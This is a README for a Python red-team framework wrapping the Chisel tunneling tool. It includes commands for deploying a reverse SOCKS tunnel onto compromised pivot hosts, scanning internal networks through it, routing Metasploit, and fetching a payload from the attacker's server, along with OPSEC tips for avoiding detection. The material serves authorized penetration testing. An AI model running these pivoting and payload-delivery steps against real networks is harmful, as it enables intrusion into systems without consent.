# Chisel Tunneling Framework v2.0

**Professional HTTP/HTTPS tunneling for restrictive networks during penetration testing and red team operations.**

## 🎯 Overview

The Chisel Tunneling Framework is a complete, production-ready toolkit for tunneling through firewalls using HTTP/HTTPS. Built with a modular architecture, it provides server and client management with comprehensive deployment capabilities.

## ✨ Features

### Core Capabilities
- **HTTP/HTTPS Tunneling**: Bypass restrictive firewalls
- **SOCKS5 Proxy**: Full network pivoting through compromised hosts
- **Port Forwarding**: Access internal services
- **Remote Access**: Expose attacker services to pivot hosts

### Professional Features
- 🔒 Binary management and validation
- 📊 Active tunnel tracking
- 🚀 Automated deployment to pivots via SSH
- ⚙️ Server and client management
- 📝 Comprehensive logging
- 🎨 Clean CLI interface

## 📦 Installation

### Prerequisites
```bash
# Install Chisel binary
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
sudo mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel
```

### Framework Installation
```bash
git clone <repository>
cd chisel_tunneling_framework
pip install -e .
```

## 🚀 Quick Start

### Start Server (Attacker Machine)
```bash
python -m chisel_tunneling.cli.main \
  --mode server \
  --port 8080
```

### SOCKS Proxy (Run on pivot or deploy)
```bash
# On pivot manually
chisel client <attacker-ip>:8080 R:socks

# Or deploy automatically
python -m chisel_tunneling.cli.main \
  --mode deploy \
  --server-ip <attacker-ip> \
  --server-port 8080 \
  --pivot-ip <pivot-ip> \
  --pivot-user root \
  --pivot-key ~/.ssh/id_rsa \
  --chisel-binary ./chisel \
  --tunnel-type socks
```

### Use SOCKS Proxy
```bash
# With proxychains
proxychains4 nmap -sT 192.168.1.0/24

# With curl
curl --socks5 127.0.0.1:1080 http://internal-server

# With Metasploit
setg Proxies socks5:127.0.0.1:1080
```

## 📚 Project Structure

```
chisel_tunneling_framework/
├── chisel_tunneling/
│   ├── core/
│   │   ├── base_tunnel.py      # Abstract base class
│   │   └── tunnel_manager.py   # Tunnel management
│   ├── server/
│   │   └── chisel_server.py    # Server implementation
│   ├── client/
│   │   ├── socks_client.py     # SOCKS proxy client
│   │   ├── forward_client.py   # Port forwarding
│   │   └── remote_client.py    # Remote access
│   ├── utils/
│   │   ├── binary_manager.py   # Chisel binary management
│   │   ├── deployment.py       # SSH deployment
│   │   ├── process_manager.py  # Process management
│   │   └── validators.py       # Input validation
│   └── cli/
│       └── main.py             # CLI interface
├── examples/
│   └── example_usage.py        # Usage examples
├── README.md
├── QUICKSTART.md
└── setup.py
```

## 🔧 Usage Scenarios

### Scenario 1: Network Pivoting
```bash
# Start server on attacker
python -m chisel_tunneling.cli.main --mode server --port 8080

# Deploy client to pivot
python -m chisel_tunneling.cli.main \
  --mode deploy \
  --server-ip 10.0.0.1 \
  --server-port 8080 \
  --pivot-ip 10.0.0.5 \
  --pivot-user root \
  --pivot-key ~/.ssh/id_rsa \
  --chisel-binary ./chisel \
  --tunnel-type socks

# Scan internal network
proxychains4 nmap -sT 192.168.1.0/24
```

### Scenario 2: Firewall Bypass
Chisel uses HTTP/HTTPS which often bypasses restrictive firewalls that block other protocols.

### Scenario 3: Payload Delivery
```bash
# Expose attacker web server to pivot
python -m chisel_tunneling.cli.main \
  --mode client \
  --type remote \
  --server-ip <attacker-ip> \
  --server-port 8080 \
  --local-port 8000 \
  --remote-port 80

# Pivot can now access: curl http://localhost:80/payload.exe
```

## 🛡️ Operational Security

### Best Practices
1. **Use HTTPS**: Enable TLS for encrypted tunnels
2. **Authentication**: Use --auth for server authentication
3. **Cleanup**: Always stop tunnels after operations
4. **Port Selection**: Use common ports (80, 443, 8080)

### Detection Considerations
- HTTP/HTTPS traffic is common and less suspicious
- Consider using TLS to encrypt tunnel traffic
- Monitor Chisel processes on pivot after operations

## 🎓 Usage as Library

```python
from ..chisel_tunneling import TunnelManager, ChiselServer, SocksClient

# Start server
manager = TunnelManager()
server = ChiselServer(port=8080)
manager.set_server(server)

# Add SOCKS client (if running locally)
client = SocksClient(
    server_ip="127.0.0.1",
    server_port=8080,
    socks_port=1080
)
manager.add_client(client)
```

## 📖 Documentation

- **QUICKSTART.md**: Quick start guide with scenarios
- **Code Comments**: Comprehensive inline documentation

## ⚖️ Legal Disclaimer

**FOR AUTHORIZED TESTING ONLY**

This framework is designed for legitimate security testing. Users must:
- Have explicit written authorization
- Comply with all applicable laws
- Use only on systems they own or have permission to test

## 📜 License

MIT License - See LICENSE file

## 👤 Author

**Maxwell Cross**
- Red Team Operations
- Advanced Penetration Testing
- Security Tool Development

---

**Remember**: Chisel is powerful for bypassing restrictive networks. Use responsibly and legally.